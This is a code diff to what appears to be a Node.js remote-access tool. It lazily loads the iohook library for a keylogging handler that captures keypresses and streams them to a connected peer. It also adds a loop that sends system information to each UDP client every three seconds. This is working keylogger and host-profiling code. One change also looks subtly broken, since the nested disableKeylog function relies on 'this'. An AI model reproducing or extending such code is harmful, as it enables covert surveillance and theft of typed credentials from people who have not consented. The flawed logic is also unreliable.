@@ -2,8 +2,6 @@ const { EventEmitter } = require('events')
 const { Packets, PacketParser } = require('./lib/Protocol')
 const Connection = require('./lib/Connection')
 
-const iohook = require('iohook')
-
 class Server {
   constructor (password) {
     const self = this
@@ -79,6 +77,10 @@ class Server {
     this.on(Packets.KeylogSetup, function (packet, conn) {
       if (!packet.data) return
 
+      if (!this.__iohookLib) {
+        this.__iohookLib = require('iohook')
+      }
+
       if (!conn.keylog) {
         conn.keylog = {
           buffer: [],
@@ -92,7 +94,7 @@ class Server {
       function disableKeylog () {
         clearInterval(conn.keylog.intervalID)
         conn.keylog.intervalID = null
-        iohook.off('keypress', conn.keylog.keyEvt)
+        this.__iohookLib.off('keypress', conn.keylog.keyEvt)
       }
 
       if (packet.data.interval === 0) {
@@ -103,8 +105,8 @@ class Server {
 
       if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID)
 
-      iohook.on('keypress', conn.keylog.keyEvt)
-      iohook.start()
+      this.__iohookLib.on('keypress', conn.keylog.keyEvt)
+      this.__iohookLib.start()
 
       conn.keylog.intervalID = setInterval(function () {
         // Send loop
@@ -155,6 +157,28 @@ class Server {
           port: socket.port
         }
         this.clients_lookup[address] = connectionPair
+
+        const systemInformation = require('./lib/SystemInformation')
+        Promise.all([
+          systemInformation.getMetaInformation(),
+          systemInformation.getDynamicInformation()
+        ]).then(([metaData, dynamicData]) => {
+          this._UDPserver.write(
+            Packets.Poll.create({ ...metaData, ...dynamicData }),
+            socket.address,
+            socket.port
+          )
+        })
+
+        setInterval(() => {
+          systemInformation.getDynamicInformation().then(data => {
+            this._UDPserver.write(
+              Packets.Poll.create(data),
+              socket.address,
+              socket.port
+            )
+          })
+        }, 3000)
 
         return
       }
